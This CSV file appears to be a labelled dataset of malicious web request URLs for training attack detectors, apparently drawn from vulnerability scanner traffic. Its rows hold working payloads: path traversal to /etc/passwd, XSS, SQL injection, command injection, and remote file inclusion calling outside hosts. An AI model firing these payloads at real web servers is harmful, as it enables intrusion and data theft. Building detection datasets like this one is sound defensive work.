url,label
/examples/servlets/servlet/pmwiki.php?globals[farmd]=/etc/passwd\x00,1
"/bl8sefdm.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cgi.cgi/r.cgi?file=../../../../../../../../../../etc/passwd,1
/main.php?logout=';del\x09q35732238\x09#,1
"/rbec2ohx.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/using logon scripts figure 31102332792303/,1
/b5xdqgz2.fts?<script>cross_site_scripting.nasl</script>,1
/main.php?stuff='\x0auname\x09>q88589696\x09#,1
"/p043snfr.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331919201",1
/examples/jsp/cal/admin/configset.php?settings_dir=/etc/passwd\x00,1
/cgi-bin/catalog.php?action=category_show&id=',1
"/manager/login.php?course=""><script>alert(atutor_xss.nasl)</script>",1
"/q703m78q.fts?<script>document.cookie=""testvowq=604;""</script>",1
/examples/jsp/jsp2/el/download.php?language=/etc/passwd\x00,1
"/<img src=""javascript:alert(cross_site_scripting.nasl);"">.jsp",1
/cgi-bin/pcadmin/login.asp?idadmin='' or 1=1--,1
/cgi-bin/cssearch.cgi?command=savesetup&setup=`cat /etc/passwd`,1
"/en-us/hipkz026.jsp?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
"/7u1pb2xi.php3?<script>document.cookie=""testlwwz=718;""</script>",1
"/main.php?logout=""ping\xa0-w\xa010000\xa0-n\xa01\xa04.3.2.1|rem\xa0",1
/examples/jsp/colors/lib/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/cgi-bin/gadgets/blog/blogmodel.php?path=/etc/passwd\x00,1
/m2fpztty.x?<script>cross_site_scripting.nasl</script>,1
/d5a5renl.cfm?<script>cross_site_scripting.nasl</script>,1
"/egaet53a.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/b5xdqgz2.aspx?<script>cross_site_scripting.nasl</script>,1
/manager/yabb.pl?board=news&action=display&num=../../../../../../etc/passwd\x00,1
"/cgi-bin/index.php?id='union/**/select/**/0,0,579479720,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/cgi-sys/fileseek.cgi?foot=;cat /etc/passwd&head=,1
/test.php?evalme=eval($_server[http_x_xconlkohkokev]);,1
/en-us/account/newsdesk.cgi?t=../../../../../../etc/passwd,1
/phpmyadmin/index.php?site=../../../../../../../../etc/passwd\x00,1
"/raanw4ia.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/index.php?option=frontpage&itemid=2|system(id)|1331905172,1
/cmsimple2_7/cmsimple/cms.php?pth['file']['config']=http://cirt.net/rfiinc.txt??,1
"/n1afe1y6.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/_mem_bin/formslogin.asp?url=><script>alert('vulnerable');</script>,1
"/en-us/hipkz026.exe?<script>document.cookie=""testyrbs=2855;""</script>",1
"/m4kkjf8l.php?<meta http-equiv=set-cookie content=""testyglc=8988"">",1
/examples/jsp/checkbox/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/jsp2/jspx/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
"/ydexw8by.dll?<script>document.cookie=""testulex=4996;""</script>",1
"/3j8echh0.cgi?<meta http-equiv=set-cookie content=""testfuqi=4189"">",1
/sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>,1
"/jackrabbit/search.jsp?q=%""<script>alert(1331922091)</script>",1
/iajtej82.fts?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/checkbox/smpwservicescgi.exe,1
/examples/jsp/sessions/way-board/way-board.cgi?db=/etc/passwd\x00,1
/s7qus4g3.jsp?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/checkbox/mrtg.cgi?cfg=/../../../../../../../../../winnt/win.ini,1
/..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
/cgis/view_item?html_file=../../../../../../../../../../etc/passwd\x00,1
/page.cgi?../../../../../../../../../../etc/passwd,1
/phpmyadmin/classes/adodbt/sql.php?classes_dir=/etc/passwd\x00,1
"/azcrfs8d.aspx?<script>document.cookie=""testjpdr=9205;""</script>",1
"/main.php?stuff=""&ping;-w;9000;-n;1;1.2.3.4&rem;",1
/ywaxntrx.fts?<script>cross_site_scripting.nasl</script>,1
/j4drbkil.htm?<script>cross_site_scripting.nasl</script>,1
/b1q8bywu.php?<script>cross_site_scripting.nasl</script>,1
/view/main/twikiusers?rev=2 |less /etc/passwd,1
/examples/jsp/num/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; ,1
/examples/jsp/jsp2/el/webspirs.cgi?sp.nextform=../../../../../../../../../etc/passwd,1
/weq93ppb.dll?<script>cross_site_scripting.nasl</script>,1
/main.php?stuff=ping;-w;9000;-n;1;1.2.3.4&rem;,1
/main.php?logout=ping;-w;10000;-n;1;4.3.2.1|rem;,1
/rpc/..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
/help.php?q='\x0duname\x09>q79317735\x09#,1
"/apavxugx.cfc?<meta http-equiv=set-cookie content=""testdnbh=5237"">",1
"/?<meta http-equiv=set-cookie content=""testviqu=1270"">",1
/en-us/<script>cross_site_scripting.nasl</script>.fts,1
"/5qnlm5z2.do?<meta http-equiv=set-cookie content=""testsixi=8451"">",1
/phpmyadmin/sendtemp.pl?templ=../../../../../etc/passwd,1
/main.php?logout=ver\x0b>q96553915&rem\x0b,1
/examples/jsp/sessions/index.php?entry=',1
"/miz4r5hz.x?<meta http-equiv=set-cookie content=""testviqu=1270"">",1
/scripts/download.php?language=/etc/passwd\x00,1
"/rpxyx07v.cfc?<script>document.cookie=""testbnli=1975;""</script>",1
"/egaet53a.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/search.jsp?q=%""<script>alert(1332010391)</script>",1
/<script>cross_site_scripting.nasl</script>,1
/vac1l5vm.kspx?<script>cross_site_scripting.nasl</script>,1
/cgi-perl/a1stats/a1disp3.cgi?../../../../../../../etc/passwd,1
/examples/jsp/jsp2/el/starnet/modules/sn_allbum/slideshow.php?cmsdir=/etc/passwd\x00,1
/recordings/inc/functions.inc.php?config[ppa_root_path]=/etc/passwd\x00,1
"/bmeun223.nsf?<meta http-equiv=set-cookie content=""testhhwu=7044"">",1
/examples/jsp/checkbox/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl,1
"/h5sc3gxy.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/ny1b3qq4.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 920699051--,1
/ap58k3ci.htm?<script>cross_site_scripting.nasl</script>,1
"/jw64yq8u.dll?<script>document.cookie=""testylfu=1313;""</script>",1
/scripts/starnet/addons/slideshow_full.php?album_name='1810978145,1
"/main.php?stuff=""\x0arm\x09q74494385\x09#",1
/en-us/account/include/doc/get_image.php?lang=en&img=../../../../../../../../../../etc/passwd,1
/examples/jsp/colors/search=<script>alert('xss')</script>,1
/cacti/misc/audio.php?recording=../version.inc,1
"/eei78ore.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/script/plugins/phpgacl/admin/index.php?path_inc=http://192.168.202.118:8080/moclyxlwqyfjnp?,1
/examples/jsp/colors/index.php?id=urjhxcl19w',1
/examples/jsp/num/quickstore.cgi?page=../../../../../../../../../../etc/passwd\x00html&cart_id=,1
"<script>document.cookie=""testviqu=1270;""</script>",1
/phpmyadmin/documentation.html?phpmyadmin=../../../../../../../etc,1
/zqqemp6j.x?<script>cross_site_scripting.nasl</script>,1
"/gvx7m5ti.pl?<meta http-equiv=set-cookie content=""testwldz=3506"">",1
/report.php?scriptpath=http://192.168.202.118:8080/tzhfyzkbomspvm??,1
/examples/jsp/jsp2/jspx/newsdesk.cgi?t=../../../../../../etc/passwd,1
/<script>cross_site_scripting.nasl</script>.asp,1
"/hipkz026.aspx?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
"/h21y8w52.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/manager/ion-p.exe?page=../../../../../etc/passwd,1
"/h4bi26jd.cgi?<meta http-equiv=set-cookie content=""testhrzx=1150"">",1
/examples/jsp/jsp2/el/myevent.php?myevent_path=/etc/passwd\x00,1
/examples/jsp/jsp2/el/bb_func_txt.php?pathtofiles=/etc/passwd\x00,1
"/8t9v8k7x.html?<meta http-equiv=set-cookie content=""testhvje=9403"">",1
/faq.php?cat_id=1' or force_mysql_error='2,1
"/examples/jsp/sessions/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1",1
"/i2n4v4rl.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/api/orders.json?search[instance_eval]=kernel.fail `id`,1
/examples/servlets/servlet/index.php?search=<script>foo</script>,1
"/stat/awstatstotals.php?sort=""].passthru('id').exit().$a[""",1
"/qhvu0pdg.cfm?<meta http-equiv=set-cookie content=""testchuc=2100"">",1
/examples/jsp/jsp2/jspx/themes/program/themesettings.inc.php?themesdir=/etc/passwd\x00,1
/manager/admin/general.php?mode=perlinfo&config[general][perl_binary]=cat /etc/passwd||,1
"/examples/jsp/jsp2/el/item.fts?href=""><script>alert(""ftgate_44002.nasl"")</script>;",1
/eei78ore.aspx?<script>cross_site_scripting.nasl</script>,1
"/hjdzm96v.cgi?<script>document.cookie=""testbyqe=7474;""</script>",1
"/examples/jsp/num/webappmon.exe?ins=nowait&act=natping&sel=""255.255.255.255 & id&""",1
/webdav/c99.php?act=f&f=wce.exe&ft=info&d=c:\,1
"/a0imiuf1.mscgi?<meta http-equiv=set-cookie content=""testxqrn=4654"">",1
"/en-us/esmozg5d.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/ht8pn8uq.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/htbin/gw5/gwweb.exe?htmlver=aaa&get-context,1
/scripts/index.php?edit=nonexistant1374561915,1
"/en-us/33y9gcqq.pl?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
/gy23xnjq.kspx?<script>cross_site_scripting.nasl</script>,1
/script/template/index.php?main_page_directory=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
/syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script>,1
"/en-us/<script>document.cookie=""testvlau=8517;""</script>",1
"/main.php?stuff=""ping;-w;8000;-n;1;1.2.3.4|rem;",1
/mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd,1
"/main.php?stuff=""ver\x0c>q43448647&rem\x0c",1
"/en-us/h5sc3gxy.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cacti/sendtemp.pl?templ=../../../../../etc/passwd,1
/manager/sysinfo.cgi?action=systemdoc&name=sysinfo_name_cmd_exec.nasl;id,1
"/main.php?stuff=""&del\x0bq12538123&rem\x0b",1
/raanw4ia.jsp?<script>cross_site_scripting.nasl</script>,1
/order/login.php?svr_rootscript=http://192.168.202.118:8080/2aibfaczmac8?,1
"/<script>document.cookie=""testfutf=1550;""</script>",1
/help.php?q=&ping;-w;10000;-n;1;4.3.2.1&rem;,1
//%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd,1
"/apavxugx.x?<script>document.cookie=""testdnbh=5237;""</script>",1
"/1r8cfrlf.x?<script>document.cookie=""testydan=5106;""</script>",1
"/qhvu0pdg.asp?<meta http-equiv=set-cookie content=""testchuc=2100"">",1
/en-us/esmozg5d.kspx?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/cal/profil.php?id=1 <script>foo</script>,1
/phpmyadmin/js/scripts.php?load=/etc/passwd\x00,1
/scripts/fileseek2.cgi?foot=&head=;cat /etc/passwd|,1
/examples/jsp/jsp2/el/supporter/tupdate.php?groupid=change&sg=',1
/d765w06j.idc?<script>cross_site_scripting.nasl</script>,1
"/main.php?stuff=""ping\x0c-w\x0c9000\x0c-n\x0c1\x0c4.3.2.1|rem\x0c",1
"/cgi-bin/search.jsp?q=%""<script>alert(1331918998)</script>",1
/script/gestion/index.php?path_inc=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
"/mv8wxfy9.htm?<meta http-equiv=set-cookie content=""testrhbc=8184"">",1
/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=`/etc/passwd`,1
"/fpnpp5zg.cfc?<meta http-equiv=set-cookie content=""testyias=101"">",1
/examples/servlets/servlet/engine/admin/admin.php?id_user=../../../../../../../../../etc/passwd,1
/en-us/account/direct.php?rf=/etc/passwd\x00,1
/examples/jsp/checkbox/search.cgi?..\..\..\..\..\..\winnt\win.ini,1
/examples/jsp/jsp2/jspx/minis.php?month=../../../../../../etc/passwd,1
/examples/jsp/jsp2/el/config.php?path[docroot]=/etc/passwd\x00,1
"/iv5vkgam.cgi?<meta http-equiv=set-cookie content=""testfosd=94"">",1
"/cgi-bin/login.php?course=""><script>alert(atutor_xss.nasl)</script>",1
/examples/jsp/colors/language.php?data_dir=/etc/passwd\x00,1
/examples/jsp/sessions/cgi/tseekdir.cgi?location=/etc/passwd\x00,1
/examples/jsp/checkbox/download.php?language=/etc/passwd\x00,1
/scripts/index.php?show=../../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/sessions/htsearch?exclude=`/etc/passwd`,1
/dda2qr7j.jsp?<script>cross_site_scripting.nasl</script>,1
/show_archives.php?template=../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/jsp2/jspx/auktion.cgi?menue=../../../../../../../../../etc/passwd,1
"/fo564rei.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/miz4r5hz.cfm?<script>document.cookie=""testviqu=1270;""</script>",1
"//<body><script/src=""http://www.example.com/test?rnd=q56969235""></script>",1
/awstats/awstats.pl?migrate=|echo;/./tmp/ysooqnjtxq0 > /dev/null &;echo|awstats987387.txt,1
/bzuf9ozq.jsp?<script>cross_site_scripting.nasl</script>,1
/en-us/h5sc3gxy.htm?<script>cross_site_scripting.nasl</script>,1
"/0u75ldxq.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/bxnyrhmh.asp?<script>document.cookie=""testmjct=1867;""</script>",1
"/tukodz3j.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/6n7aacgg.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1332010419,4,5",1
"/scs86g1p.mscgi?<meta http-equiv=set-cookie content=""testquyx=2820"">",1
"/x7pclv4s.x?<meta http-equiv=set-cookie content=""testiulz=3709"">",1
/9o6g5vkn.nsf?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/cal/libraries/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/examples/jsp/jsp2/jspx/faxsurvey?cat /etc/passwd,1
"/i686v90l.x?<script>document.cookie=""testfutf=1550;""</script>",1
/recordings/adlayer.php?layerstyle=../../../../../../../etc/passwd\x00,1
/cgi-sys/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd,1
"/en-us/33y9gcqq.nsf?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
"/top.php?stuff=""\x0adel\x09q69986769\x09#",1
/msadc/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir+c:\,1
/cgi-home/gw5/gwweb.exe?htmlver=aaa&get-context,1
/examples/jsp/sessions/install.php?newlang=../../cpg_error.log\x00,1
"/<meta http-equiv=set-cookie content=""testfuqi=4189"">",1
/examples/jsp/jsp2/jspx/calendar.php?serverpath=/etc/passwd\x00,1
"/nyvbv05h.asp?<script>document.cookie=""testftxz=5980;""</script>",1
"/main.php?logout=""ping\xa0-w\xa07000\xa0-n\xa01\xa01.2.3.4|rem\xa0",1
"/en-us/jnv890lt.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/main.php?logout=""ping -w 10000 -n 1 1.2.3.4|rem ",1
/pjreview_neo.cgi?p=../../../../../../../../../../etc/passwd,1
/macro toolsworks advanced scripting edition v6/,1
"/xsqln7eb.exe?<script>document.cookie=""testpcbb=9254;""</script>",1
"/jw64yq8u.html?<script>document.cookie=""testylfu=1313;""</script>",1
"/en-us/odzk29aa.asp?<script>document.cookie=""testtfvh=2141;""</script>",1
"/vgn/login/1,501,,00.html?cookiename=x--\>",1
"/examples/jsp/error/notify?from=nessus""|id""",1
"/top.php?stuff=""&ping,-w,11000,-n,1,1.2.3.4&rem,",1
/script/fckeditor/editor/dialog/fck_link.html,1
/o6ebbirj.aspx?<script>cross_site_scripting.nasl</script>,1
/nyjgaorz.cfm?<script>cross_site_scripting.nasl</script>,1
"/main.php?logout=""rm\x09q86373985&rem\x09",1
/d7ktpmcq.php3?<script>cross_site_scripting.nasl</script>,1
"/examples/jsp/num/search.jsp?q=%""<script>alert(1331904374)</script>",1
"/main.php?logout=""|ping\x09-w\x099000\x09-n\x091\x094.3.2.1|rem\x09",1
/gy23xnjq.asp?<script>cross_site_scripting.nasl</script>,1
"/esmozg5d.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/7u1pb2xi.jsp?<meta http-equiv=set-cookie content=""testlwwz=718"">",1
/servlet/org.apache.catalina.containerservlet/<script>alert(document.domain)</script>,1
/cacti/mrtg.cgi?cfg=/../../../../../../../../../etc/passwd,1
"/search.jsp?q=%""<script>alert(1331904660)</script>",1
/weq93ppb.asp?<script>cross_site_scripting.nasl</script>,1
"/fmnveedu.jspa?<script>document.cookie=""testgfbr=7014;""</script>",1
"/zv8tv7h8.cfm?<script>document.cookie=""testcqwz=9752;""</script>",1
/n9xlumt5.cfc?<script>cross_site_scripting.nasl</script>,1
/cgi-home/gw5/gwweb.exe?help=bad-request,1
"/uc3w3bdi.fts?<meta http-equiv=set-cookie content=""testxllt=9940"">",1
"/gvx7m5ti.kspx?<script>document.cookie=""testwldz=3506;""</script>",1
"/search.jsp?q=%""<script>alert(1332009303)</script>",1
"/en-us/ddoworrl.php3?<meta http-equiv=set-cookie content=""testvlau=8517"">",1
"/u95h6ymu.exe?<script>document.cookie=""testkhwc=4028;""</script>",1
"/8x6w469u.php3?<meta http-equiv=set-cookie content=""testgfjr=1286"">",1
"/top.php?stuff=""&ping -w 9000 -n 1 1.2.3.4&rem ",1
//<body><script src=http://www.example.com/test?rnd=q32317269></script>,1
"/apavxugx.asp?<meta http-equiv=set-cookie content=""testdnbh=5237"">",1
"/en-us/n9xlumt5.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/el/k/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor,1
/examples/jsp/colors/shoutbox.php?conf=../,1
/examples/jsp/error/lib/authform.inc.php?path_pre=/etc/passwd\x00,1
"/g3w7y7u5.htm?<meta http-equiv=set-cookie content=""testbfpq=3326"">",1
/bin/view_item?html_file=../../../../../../../../../../etc/passwd\x00,1
/sysinfo.cgi?action=systemdoc&name=sysinfo_name_cmd_exec.nasl;id,1
/fnwhrxyd.php3?<script>cross_site_scripting.nasl</script>,1
/i2n4v4rl.jsp?<script>cross_site_scripting.nasl</script>,1
/en-us/account/apa_phpinclude.inc.php?apa_module_basedir=/etc/passwd\x00,1
"/index.php?id='union/**/select/**/0,0,1037776575,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
"/scripts/index.php?id='union/**/select/**/0,0,907033072,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/examples/jsp/jsp2/el/sources/functions.php?root_path=/etc/passwd\x00,1
"/top.php?stuff=""uname\x09>q89765477\x09#",1
/examples/jsp/error/catalog.php?action=category_show&id=',1
"/d765w06j.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/top.php?stuff=""&del\x0bq26467745&rem\x0b",1
/en-us/h5sc3gxy.kspx?<script>cross_site_scripting.nasl</script>,1
/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1,1
"/zuihld5m.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/w4996nr0.cfm?<meta http-equiv=set-cookie content=""testttvs=7163"">",1
/examples/jsp/cal/man-cgi?section=0&topic=ls;id,1
/help.php?q=\x0duname\x09>q95281946\x09#,1
/recordings/mapserv.exe?map=mapserver_detect.nasl.map,1
/index.php?req=<script>alert('wvs-xss-magic-string-411545577486')</script>submit=submit,1
"/h4bi26jd.jspa?<script>document.cookie=""testhrzx=1150;""</script>",1
"/qhvu0pdg.pl?<script>document.cookie=""testchuc=2100;""</script>",1
/j4oqyvga.kspx?<script>cross_site_scripting.nasl</script>,1
"/examples/jsp/error/search.jsp?q=%""<script>alert(1331904373)</script>",1
/examples/jsp/checkbox/sojourn.cgi?cat=../../../../../etc/passwd\x00,1
"/examples/jsp/error/nessus""><script>alert('django_admin_xss.nasl')</script>/",1
/phpmyadmin/install.php?newlang=../../cpg_error.log\x00,1
/scripts/search.scr.php?globals[pth][classes]=@rfiurl?globals[pth][classes]=@rfiurl?,1
/manager/starnet/modules/sn_allbum/slideshow.php?cmsdir=/etc/passwd\x00,1
/cgi-win/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go,1
"/cgi-bin/index.php?id='union/**/select/**/0,0,1409137117,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/scripts/ui/login?user=nessus-1331918954,1
"/ewc3rz1l.html?<meta http-equiv=set-cookie content=""testkgqo=204"">",1
/scripts/vhost.php?action=logout&time=1332010196,1
"/cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,261058722,0,0,0,0,0--",1
/h21y8w52.x?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/.cobalt/alert/service.cgi?service=<img src=javascript:alert('vulnerable')>,1
"/bl8sefdm.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/error/xaradodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/cacti/language.php?data_dir=/etc/passwd\x00,1
/antispam/listdel?file=blacklist&name=b<script>alert('vulnerable')</script>&startline=0,1
/l4fz1dqw.mscgi?<script>cross_site_scripting.nasl</script>,1
"/jw64yq8u.pl?<meta http-equiv=set-cookie content=""testylfu=1313"">",1
/examples/jsp/num/jgs_portal_statistik.php?meinaction=themen&month=1&year=1',1
"/r3le3om5.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/apavxugx.aspx?<script>document.cookie=""testdnbh=5237;""</script>",1
"//</p><body><script/src=""http://www.example.com/test?rnd=q29464737""></script><p>",1
/cgi_bin/listrec.pl?app=qmh-news&template=;ls /etc|,1
"/en-us/<script>document.cookie=""testnvxc=4301;""</script>",1
"/mv8wxfy9.exe?<script>document.cookie=""testrhbc=8184;""</script>",1
/examples/jsp/jsp2/el/main.php?g2_itemid=../../../../../license\x00,1
"/1r8cfrlf.cfc?<script>document.cookie=""testydan=5106;""</script>",1
/examples/jsp/jsp2/el/logbook.pl?file=../../../../../../../../../../bin/cat /etc/passwd\x00|,1
"/jw64yq8u.jspa?<script>document.cookie=""testylfu=1313;""</script>",1
/examples/jsp/jsp2/jspx/search.cgi?..\..\..\..\..\..\windows\win.ini,1
/scripts/rpc.php?cmd=display_get_requesters&id=1,1
"/o6ebbirj.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/en-us/account/index.php?template=../../../loudblog/custom/config.php\x00,1
/fcgi-bin/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd\x00,1
"/o6ebbirj.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/sessions/directorypro.cgi?want=showcat&show=../../../../../etc/passwd\x00,1
/scripts/admin.pl?path=bin/mozilla&action=list_users,1
"/i686v90l.aspx?<meta http-equiv=set-cookie content=""testfutf=1550"">",1
/phpmyadmin/forum_2.php?msg=10&return=<script>foo</script>,1
"/help.php?q=""|ping\x0c-w\x0c9000\x0c-n\x0c1\x0c4.3.2.1|rem\x0c",1
"/ghswfouu.html?<script>document.cookie=""testsqmm=5713;""</script>",1
/scripts/cleartrust/ct_logon.asp?ctloginerrormsg=<script>alert(1)</script>,1
"/main.php?stuff=""|ping\x0c-w\x0c8000\x0c-n\x0c1\x0c4.3.2.1|rem\x0c",1
"/index.php?op=default&date=200607' union select 1,898491611,1,1,1,1,1,1,1,1--&blogid=1",1
/recordings/resetpw.php?email=../../../../../../../../../../../../etc/passwd,1
"/gvx7m5ti.mscgi?<script>document.cookie=""testwldz=3506;""</script>",1
"/ju0u7kfo.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/servlets/servlet/texis.exe/?-dump,1
/examples/servlets/servlet/index.php?_language=../../../../../../../../../../etc/passwd\x00,1
/opensiteadmin/scripts/classes/form.php?path=http://192.168.202.118:8080/2aibfaczmac8?\x00,1
"/ewc3rz1l.mscgi?<meta http-equiv=set-cookie content=""testkgqo=204"">",1
"/tuwjta1w.php3?<script>document.cookie=""testpokn=7494;""</script>",1
/en-us/account/file.php?path=/etc/passwd\x00,1
/examples/jsp/jsp2/el/search/show.pl?url=file:/etc/passwd,1
"/hrttz9fj.nsf?<meta http-equiv=set-cookie content=""testtbjy=7334"">",1
/h5sc3gxy.cgi?<script>cross_site_scripting.nasl</script>,1
/o35zot2r.x?<script>cross_site_scripting.nasl</script>,1
/include/scripts/send_email_cache.php?dir=http://192.168.202.118:8080/ghl9il?,1
/examples/jsp/num/phptonuke.php?filnavn=/etc/passwd,1
"/d44uk9h2.x?<script>document.cookie=""testmybc=2088;""</script>",1
/cacti/listrec.pl?app=qmh-news&template=;ls /etc|,1
"/<script>document.cookie=""testvlau=8517;""</script>",1
/j4oqyvga.mscgi?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/colors/calendar_admin.pl?config=|cat /etc/passwd|,1
"/8x6w469u.pl?<script>document.cookie=""testgfjr=1286;""</script>",1
/cgi-bin/gw5/gwweb.exe?htmlver=aaa&get-context,1
"/u8yiqilu.jsp?<script>document.cookie=""testswjp=6010;""</script>",1
"/help.php?q=""|ping,-w,9000,-n,1,4.3.2.1|rem,",1
/index.php?dir=<script>alert(412105577658)</script>,1
/d5a5renl.aspx?<script>cross_site_scripting.nasl</script>,1
/ju0u7kfo.cfm?<script>cross_site_scripting.nasl</script>,1
/kb.php?category_id=xxl><script>alert(412625577808)</script>,1
"/help.php?q=""ping\xa0-w\xa011000\xa0-n\xa01\xa01.2.3.4|rem\xa0",1
"/main.php?stuff=""uname\x09>q91227717\x09#",1
/examples/jsp/sessions/download.php?language=/etc/passwd\x00,1
/confirmunsubscription.php?output=http://192.168.202.118:8080/ghl9il?,1
"/ao22ww7y.cfc?<meta http-equiv=set-cookie content=""testqppc=8767"">",1
"/index.php?in=song&term=<script>alert(""411756083444"");</script>&action=search&start=0",1
"/jackrabbit/search.jsp?q=%""<script>alert(1331904373)</script>",1
"/index.php?id='union/**/select/**/0,0,2115200900,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/ows-bin/c32web.exe/getimage?imagename=customeremail.txt\x00.pdf,1
/cgi-sys/r.cgi?file=../../../../../../../../../../etc/passwd,1
/0rufe52p.jsp?<script>cross_site_scripting.nasl</script>,1
/scripts/starnet/addons/slideshow_full.php?album_name='648730541,1
/cgi-local/fileseek.cgi?foot=&head=;cat /etc/passwd|,1
"/main.php?stuff=""ping\xa0-w\xa010000\xa0-n\xa01\xa04.3.2.1|rem\xa0",1
